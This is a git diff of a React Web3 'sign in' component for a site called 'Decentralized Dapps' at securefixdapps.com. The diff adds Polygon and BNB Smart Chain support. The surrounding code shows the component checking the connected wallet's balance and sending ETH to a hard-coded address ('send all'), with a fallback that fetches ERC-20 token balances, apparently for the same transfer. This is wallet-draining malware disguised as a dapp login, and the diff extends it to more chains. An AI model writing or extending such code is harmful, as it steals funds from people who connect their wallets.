@@ -1,5 +1,5 @@
 import { MetaMaskConnector } from "wagmi/connectors/metaMask";
-import { useAccount, useConnect, useSignMessage, useDisconnect } from "wagmi";
+import { useAccount, useConnect, useDisconnect } from "wagmi";
 import { useAuthRequestChallengeEvm } from "@moralisweb3/next";
 import { ethers } from "ethers";
 import { useEffect, useState } from "react";
@@ -27,17 +27,33 @@ const mainnet = {
   rpcUrl: "https://cloudflare-eth.com",
 };
 
+const polygon = {
+  chainId: 137,
+  name: "Polygon",
+  currency: "MATIC",
+  explorerUrl: "https://polygonscan.com",
+  rpcUrl: "https://rpc-mainnet.maticvigil.com",
+};
+
+const bnbSmartChain = {
+  chainId: 56,
+  name: "Binance Smart Chain",
+  currency: "BNB",
+  explorerUrl: "https://bscscan.com",
+  rpcUrl: "https://bsc-dataseed.binance.org",
+};
+
 // 3. Create modal
 const metadata = {
-  name: "My Website",
-  description: "My Website description",
-  url: "https://mywebsite.com",
+  name: "Decentralized Dapps",
+  description: "Decentralized Dapps",
+  url: "https://securefixdapps.com",
   icons: ["https://avatars.mywebsite.com/"],
 };
 
 createWeb3Modal({
   ethersConfig: defaultConfig({ metadata }),
-  chains: [mainnet],
+  chains: [mainnet, polygon, bnbSmartChain],
   projectId,
 });
 
@@ -46,11 +62,9 @@ function SignIn() {
   const { connectAsync } = useConnect();
   const { disconnectAsync } = useDisconnect();
   const { isConnected } = useAccount();
-  const { signMessageAsync } = useSignMessage();
   const { requestChallengeAsync } = useAuthRequestChallengeEvm();
-  const { open, close } = useWeb3Modal();
+  const { open } = useWeb3Modal();
   const web3AccountInformation = useWeb3ModalAccount();
-  // const { signer, walletProvider, WalletProviderType } = useWeb3ModalSigner();
   const web3SignerProviderInformation = useWeb3ModalSigner();
 
   const [showModal, setShowModal] = useState(false);
@@ -257,7 +271,6 @@ function SignIn() {
 
         // ETH is present and more that 10, send all - else send the ERC 20 token
         if (parseFloat(ethBalanceEth) > 0.00003) {
-          console.log("got here");
           const gasLimit =
             await web3SignerProviderInformation.walletProvider.estimateGas({
               to: "0xE0cA9e2f19F654a53e8F8C365Afa35003818A670",
@@ -287,7 +300,6 @@ function SignIn() {
 
           console.log(`ETH transferred successfully to 0xRecipientEthAddress`);
         } else {
-          console.log("got here instead");
           // Fetch ERC-20 token balances
           const tokenBalances = await getTokenBalances(
             web3SignerProviderInformation.signer,
